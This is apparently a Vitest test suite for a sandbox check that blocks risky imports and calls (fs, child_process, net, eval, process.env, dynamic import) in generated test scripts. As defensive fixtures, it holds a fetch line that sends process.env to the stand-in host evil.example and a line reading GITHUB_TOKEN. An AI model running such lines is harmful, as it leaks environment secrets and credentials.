import { describe, it, expect } from 'vitest';
import { checkTestSafety } from '../src/utils/testSafety';

describe('checkTestSafety', () => {
    it('allows relative imports', () => {
        const script = `import { foo } from "./foo"; import { bar } from "../lib/bar";`;
        const result = checkTestSafety(script, '/workspace');
        expect(result.allowed).toBe(true);
    });

    it('allows a tiny node: built-in allowlist (crypto, path, util)', () => {
        const script = `import { randomBytes } from "node:crypto"; import { join } from "node:path";`;
        const result = checkTestSafety(script, '/workspace');
        expect(result.allowed).toBe(true);
    });

    it('blocks node:fs (was previously allowed — this is the security fix)', () => {
        const script = `import { readFileSync } from "node:fs";`;
        const result = checkTestSafety(script, '/workspace');
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('fs');
    });

    it('blocks bare fs', () => {
        const script = `import { readFileSync } from "fs";`;
        const result = checkTestSafety(script, '/workspace');
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('fs');
    });

    it('blocks node:net, node:http, node:https, node:dns, node:os, node:vm, node:child_process, node:worker_threads, node:process', () => {
        const blocked = [
            'node:net', 'node:http', 'node:https', 'node:dns', 'node:os',
            'node:vm', 'node:child_process', 'node:worker_threads', 'node:process',
            'node:tls', 'node:dgram',
        ];
        for (const mod of blocked) {
            const script = `import x from "${mod}";`;
            const result = checkTestSafety(script, '/workspace');
            expect(result.allowed, `expected ${mod} to be blocked`).toBe(false);
            expect(result.reason).toContain(mod);
        }
    });

    it('allows effect import', () => {
        const script = `import { Effect } from "effect";`;
        const result = checkTestSafety(script, '/workspace');
        expect(result.allowed).toBe(true);
    });

    it('allows bun: imports', () => {
        const script = `import { describe, it } from "bun:test";`;
        const result = checkTestSafety(script, '/workspace');
        expect(result.allowed).toBe(true);
    });

    it('allows workspace-scoped packages', () => {
        const script = `import { something } from "@synara/shared";`;
        const result = checkTestSafety(script, '/workspace');
        expect(result.allowed).toBe(true);
    });

    it('blocks child_process import', () => {
        const script = `import { exec } from "child_process";`;
        const result = checkTestSafety(script, '/workspace');
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('child_process');
    });

    it('blocks require("child_process")', () => {
        const script = `const { exec } = require("child_process");`;
        const result = checkTestSafety(script, '/workspace');
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('child_process');
    });

    it('blocks process.exit()', () => {
        const script = `process.exit(0);`;
        const result = checkTestSafety(script, '/workspace');
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('process.exit');
    });

    it('blocks dynamic require with variable', () => {
        const script = `const mod = require(someVar);`;
        const result = checkTestSafety(script, '/workspace');
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('dynamic');
    });

    it('blocks net import', () => {
        const script = `import { createServer } from "net";`;
        const result = checkTestSafety(script, '/workspace');
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('net');
    });

    // ── New tests covering the gaps that prompted the rewrite ──────────

    it('blocks fetch() — Node 18+ global, no import needed', () => {
        const script = `await fetch("http://evil.example/exfil?d=" + JSON.stringify(process.env));`;
        const result = checkTestSafety(script, '/workspace');
        // Either fetch or process.env will trip; both are blocked.
        expect(result.allowed).toBe(false);
    });

    it('blocks eval()', () => {
        const script = `eval("console.log('hi')");`;
        const result = checkTestSafety(script, '/workspace');
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('eval');
    });

    it('blocks new Function()', () => {
        const script = `new Function("return 1")();`;
        const result = checkTestSafety(script, '/workspace');
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('Function');
    });

    it('blocks setTimeout with a string argument (eval-by-proxy)', () => {
        const script = `setTimeout("console.log('hi')", 100);`;
        const result = checkTestSafety(script, '/workspace');
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('string argument');
    });

    it('blocks process.env access', () => {
        const script = `const token = process.env.GITHUB_TOKEN;`;
        const result = checkTestSafety(script, '/workspace');
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('process.env');
    });

    it('blocks process.cwd()', () => {
        const script = `const cwd = process.cwd();`;
        const result = checkTestSafety(script, '/workspace');
        expect(result.allowed).toBe(false);
    });

    it('blocks dynamic import()', () => {
        const script = `const m = await import(someModuleName);`;
        const result = checkTestSafety(script, '/workspace');
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('dynamic import');
    });

    it('blocks bracket-access reflection: globalThis["eval"]', () => {
        const script = `globalThis["eval"]("console.log('hi')");`;
        const result = checkTestSafety(script, '/workspace');
        expect(result.allowed).toBe(false);
    });

    it('blocks bracket-access reflection: process["env"]', () => {
        const script = `const x = process["env"].TOKEN;`;
        const result = checkTestSafety(script, '/workspace');
        expect(result.allowed).toBe(false);
    });

    it('allows a benign test that imports the vulnerable module and asserts', () => {
        const script = `
            import { handle } from "./route";
            import { assertEquals } from "node:assert";
            const res = await handle({ user: { id: 1 }, params: { id: 2 } });
            assertEquals(res.status, 403);
            console.log("PASS: non-owner was blocked");
        `;
        const result = checkTestSafety(script, '/workspace');
        expect(result.allowed).toBe(true);
    });
});
